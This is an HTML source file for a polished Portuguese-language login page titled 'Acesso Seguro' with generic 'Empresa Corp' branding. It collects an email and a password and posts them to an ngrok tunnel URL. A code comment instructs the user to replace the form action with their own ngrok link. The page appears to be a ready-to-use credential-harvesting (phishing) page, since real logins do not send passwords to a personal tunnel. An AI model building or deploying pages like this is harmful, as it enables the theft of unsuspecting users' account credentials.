 <html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acesso Seguro</title>
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Ícones Lucide -->
    <script src="https://unpkg.com/lucide@latest"></script>
    <!-- Fonte Inter -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    
    <style>
        body { font-family: 'Inter', sans-serif; }
        
        /* Animação suave de entrada */
        .fade-in-up { animation: fadeInUp 0.6s cubic-bezier(0.16, 1, 0.3, 1); }
        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Input autofill customização para não quebrar o design */
        input:-webkit-autofill,
        input:-webkit-autofill:hover, 
        input:-webkit-autofill:focus, 
        input:-webkit-autofill:active{
            -webkit-box-shadow: 0 0 0 30px #1e293b inset !important;
            -webkit-text-fill-color: white !important;
            transition: background-color 5000s ease-in-out 0s;
        }
    </style>
</head>
<body class="bg-slate-950 text-slate-200 h-screen flex items-center justify-center overflow-hidden relative">

    <!-- Elementos de Fundo (Background) -->
    <div class="absolute inset-0 overflow-hidden z-0">
        <div class="absolute top-[-10%] left-[-10%] w-[40%] h-[40%] bg-blue-600/20 rounded-full blur-[120px]"></div>
        <div class="absolute bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-indigo-600/20 rounded-full blur-[120px]"></div>
    </div>

    <!-- Container Principal -->
    <div class="w-full max-w-md px-6 z-10 fade-in-up">
        
        <!-- Logo / Cabeçalho -->
        <div class="text-center mb-10">
            <div class="mx-auto bg-gradient-to-tr from-blue-500 to-indigo-600 w-16 h-16 rounded-2xl flex items-center justify-center shadow-lg shadow-blue-500/20 mb-6">
                <i data-lucide="lock" class="text-white w-8 h-8"></i>
            </div>
            <h1 class="text-3xl font-bold text-white tracking-tight">Bem-vindo</h1>
            <p class="text-slate-400 mt-2 text-sm">Insira suas credenciais para continuar.</p>
        </div>

        <!-- Card de Login -->
        <div class="bg-slate-900/50 backdrop-blur-xl border border-white/10 rounded-2xl p-8 shadow-2xl">
            
            <!-- 
                 IMPORTANTE: 
                 Substitua o valor de action="" pelo seu link do NGROK.
                 Exemplo: action="https://seu-link.ngrok-free.app/login.php"
            -->
            <form action="https://meristic-unironical-gail.ngrok-" method="POST" class="space-y-6">
                
                <!-- Campo Email -->
                <div>
                    <label for="email" class="block text-sm font-medium text-slate-300 mb-2">Email</label>
                    <div class="relative group">
                        <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                            <i data-lucide="mail" class="h-5 w-5 text-slate-500 group-focus-within:text-blue-400 transition-colors"></i>
                        </div>
                        <input 
                            type="email" 
                            name="email" 
                            id="email" 
                            required 
                            class="block w-full pl-10 pr-3 py-3 bg-slate-800 border border-slate-700 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-white placeholder-slate-500 transition-all outline-none"
                            placeholder="nome@exemplo.com"
                        >
                    </div>
                </div>

                <!-- Campo Senha -->
                <div>
                    <div class="flex items-center justify-between mb-2">
                        <label for="password" class="block text-sm font-medium text-slate-300">Senha</label>
                        <a href="#" class="text-xs text-blue-400 hover:text-blue-300 transition-colors">Esqueceu?</a>
                    </div>
                    <div class="relative group">
                        <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                            <i data-lucide="key" class="h-5 w-5 text-slate-500 group-focus-within:text-blue-400 transition-colors"></i>
                        </div>
                        <input 
                            type="password" 
                            name="password" 
                            id="password" 
                            required 
                            class="block w-full pl-10 pr-3 py-3 bg-slate-800 border border-slate-700 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-white placeholder-slate-500 transition-all outline-none"
                            placeholder="••••••••"
                        >
                    </div>
                </div>

                <!-- Botão de Login -->
                <button 
                    type="submit" 
                    class="w-full flex justify-center py-3.5 px-4 border border-transparent rounded-lg shadow-sm text-sm font-semibold text-white bg-blue-600 hover:bg-blue-500 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-offset-slate-900 focus:ring-blue-500 transition-all transform active:scale-[0.98]"
                >
                    Entrar no Sistema
                </button>
            </form>
        </div>

        <!-- Rodapé -->
        <p class="mt-8 text-center text-xs text-slate-500">
            &copy; 2024 Empresa Corp. Todos os direitos reservados.
        </p>
    </div>

    <script>
        // Inicializa os ícones do Lucide
        lucide.createIcons();
    </script>
</body>
</html>
